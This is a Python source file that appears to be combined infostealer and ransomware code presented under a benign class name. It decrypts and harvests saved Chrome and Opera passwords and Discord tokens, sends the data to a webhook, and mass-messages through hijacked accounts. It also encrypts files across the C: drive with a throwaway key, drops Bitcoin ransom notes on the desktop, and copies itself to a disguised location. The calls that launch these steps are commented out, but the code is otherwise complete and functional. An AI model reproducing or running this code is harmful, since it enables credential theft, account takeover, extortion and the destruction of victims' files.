import os
import re
import requests
import random
import shutil
from ctypes import windll, byref, cdll, c_char, c_buffer, POINTER, Structure
from base64 import b64decode
from json import loads as json_loads
from json import dumps as json_dumps
from sqlite3 import connect as sql_connect
from Crypto.Cipher import AES
from ctypes.wintypes import DWORD
from cryptography.fernet import Fernet
import http.server
import socketserver
import webbrowser
import time
import string
from pathlib import Path
import sys
from win32crypt import CryptUnprotectData

class PasswordDecryptor:
    class DATA_BLOB(Structure):
        _fields_ = [
            ('cbData', DWORD),
            ('pbData', POINTER(c_char))
        ]

    def __init__(self):
        self.local = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.temp = os.getenv("TEMP")
        self.cipher_suite = Fernet(Fernet.generate_key())
        self.username = os.getenv("USERNAME")
        self.message = "hey"
        self.webhook = ""
        self.browserPaths = [
            [f"{self.roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{self.roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{self.roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{self.local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
            [f"{self.local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
        ]

    @staticmethod
    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    @staticmethod
    def DecryptValue(buff, master_key=None, method="normal"):
      if method == "normal":
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
      else:
          try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
          except Exception as e:
              print(e)
              return "Error"
        
    @staticmethod
    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = PasswordDecryptor.DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = PasswordDecryptor.DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = PasswordDecryptor.DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(
            byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
        ):
            return PasswordDecryptor.GetData(blob_out)
    
    def GetPasswords(self):
        passwords = []
        for path, arg in [(self.browserPaths[0][0], self.browserPaths[0][3]), (self.browserPaths[3][0], self.browserPaths[3][3])]:

            if not os.path.exists(path):
                continue

            pathC = path + arg + "/Login Data"
            if os.stat(pathC).st_size == 0:
                continue

            tempfold = self.temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

            shutil.copy2(pathC, tempfold)
            conn = sql_connect(tempfold)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
            data = cursor.fetchall()
            cursor.close()
            conn.close()
            os.remove(tempfold)

            pathKey = os.path.join(path, "Local State")
            with open(pathKey, 'r', encoding='utf-8') as f:
                local_state = json_loads(f.read())
            master_key = b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = self.CryptUnprotectData(master_key[5:])

            for row in data:
                if row[0] != '':
                    passwords.append({"url": row[0], "username": row[1], "password": self.DecryptValue(row[2], master_key)})
        
        return passwords
    
    @staticmethod
    def checkToken(token):
        try:
           return requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'}).status_code == 200
        except: return False
    
    def getTokens(self):
        tokens = []
        cleaned = []
        checker = []
        already_check = []
        working = []
        paths = {
            'Discord': self.roaming + '\\discord',
            'Discord Canary': self.roaming + '\\discordcanary',
            'Lightcord': self.roaming + '\\Lightcord',
            'Discord PTB': self.roaming + '\\discordptb',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': self.local + '\\Amigo\\User Data',
            'Torch': self.local + '\\Torch\\User Data',
            'Kometa': self.local + '\\Kometa\\User Data',
            'Orbitum': self.local + '\\Orbitum\\User Data',
            'CentBrowser': self.local + '\\CentBrowser\\User Data',
            '7Star': self.local + '\\7Star\\7Star\\User Data',
            'Sputnik': self.local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': self.local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': self.local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': self.local + "\\Google\\Chrome\\User Data" + 'Default',
            'Epic Privacy Browser': self.local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': self.local + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': self.local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': self.local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': self.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': self.local + '\\Iridium\\User Data\\Default'
        }
        for xolo, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = json_loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = self.DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:], "")
                    checker.append(tok)
                except Exception as e: continue
                
            for value in checker:    
                if value not in already_check and value not in working:
                    already_check.append(value)
                    if self.checkToken(tok):
                        working.append(tok)
        return working
    
    def massDm(self, tokens):      
        for token in tokens:
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
            for channel in channelIds:
                try:
                    request = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers={'Authorization': token}, data={"content": self.message})
                except: 
                    continue
        
    def encryptFiles(self):
        for root, dirs, files in os.walk(r"C:"):
            for file_name in files:
                
                if "System" in file_name or ".exe" in file_name: continue
                file_path = os.path.join(root, file_name)
                try:
                    with open(file_path, 'wb') as file:
                        content = file.read()
                    encrypted_content = self.cipher_suite.encrypt(content)
                    
                    with open(file_path, 'wb') as file:
                        file.write(encrypted_content)    
                except Exception as e:
                    continue
    
    @staticmethod
    def notify():
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Your PC Encryption</title>
        </head>
        <body>
            <h1>Your PC has been Encrypted!</h1>
            <p>Your personal files have been encrypted and locked. To unlock them, please make a payment of 0.0019 Bitcoin to the following address:</p>
            <p><strong>Bitcoin Address: bc1q8jqcnu33cfgcjk3tw85949vpk3d86he2dqgmvx</strong></p>
            <p>Once the payment is confirmed, your files will be decrypted and accessible again.</p>
            <p><em>Failure to make the payment within 72 hours will result in permanent loss of your data.</em></p>
        </body>
        </html>
        """
        Handler = http.server.SimpleHTTPRequestHandler
        class MyHandler(Handler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(html_content.encode("utf-8"))
        
        with socketserver.TCPServer(("", 8000), MyHandler) as httpd:
            time.sleep(5)
            webbrowser.open_new_tab(f"http://localhost:{8000}")
            httpd.serve_forever()
    
    class WebhookSender:
        def __init__(self, webhook):
            self.webhook = webhook
            
        def send_webhook(self, data, batch_size=10):
            for i in range(0, len(data), batch_size):
                batch = data[i:i + batch_size]
                payload = {
                    'content': f"```json\n{json_dumps(batch, indent=4)}```"
                }
                requests.post(self.webhook, json=payload)
                    
        def format_message(self, data_dict):
            message_list = []
            for key, value in data_dict.items():
                formatted_message = f'{key}: {value}'
                message_list.extend(self.chunk_message(formatted_message, 1500))
            return message_list
        
        def chunk_message(self, message, chunk_size):
            return [message[i:i + chunk_size] for i in range(0, len(message), chunk_size)]
    
    def send_webhook(self, data):
        
        self.WebhookSender(self.webhook).send_webhook(data)
    
    def spam_files(self):
      for i in range(100):
        try:
            with open(fr"C:\Users\{self.username}\Desktop\{''.join(random.choice(string.ascii_letters) for _ in range(5))}.txt", 'w') as file:
                file.write("""Your PC has been Encrypted!\nYour personal files have been encrypted and locked. To unlock them, please make a payment of 0.0019 Bitcoin to the following address:\nBitcoin Address: bc1q8jqcnu33cfgcjk3tw85949vpk3d86he2dqgmvx\n\nOnce the payment is confirmed, your files will be decrypted and accessible again.\n\nFailure to make the payment within 72 hours will result in permanent loss of your data.""")
        except:
          for i in range(100):
            try:
                with open(fr"C:\Users\{self.username}\OneDrive\Desktop\{''.join(random.choice(string.ascii_letters) for _ in range(5))}.txt", 'w') as file:
                    file.write("""Your PC has been Encrypted!\nYour personal files have been encrypted and locked. To unlock them, please make a payment of 0.0019 Bitcoin to the following address:\nBitcoin Address: bc1q8jqcnu33cfgcjk3tw85949vpk3d86he2dqgmvx\n\nOnce the payment is confirmed, your files will be decrypted and accessible again.\n\nFailure to make the payment within 72 hours will result in permanent loss of your data.""")
            except: continue
          return
      return
    
    def move_and_rename_to_local_appdata(self):
        try:
            if self.local is None:
                sys.exit()
            
            current_script = os.path.realpath(__file__)
            new_location = os.path.join(self.local, "system.py")
            
            if os.path.dirname(current_script) == self.local:
                return True
            
            shutil.copyfile(current_script, new_location)
            os.remove(current_script)
            os.system(new_location)
            return False
        except Exception as e:
            print("An error occurred:", e)


decryptor = PasswordDecryptor()
#if not decryptor.move_and_rename_to_local_appdata(): sys.exit()
#passwords = decryptor.GetPasswords()
#decryptor.send_webhook(passwords)
#tokens = decryptor.getTokens()
#decryptor.massDm(tokens)
#decryptor.encryptFiles()
#decryptor.spam_files()
#decryptor.notify()
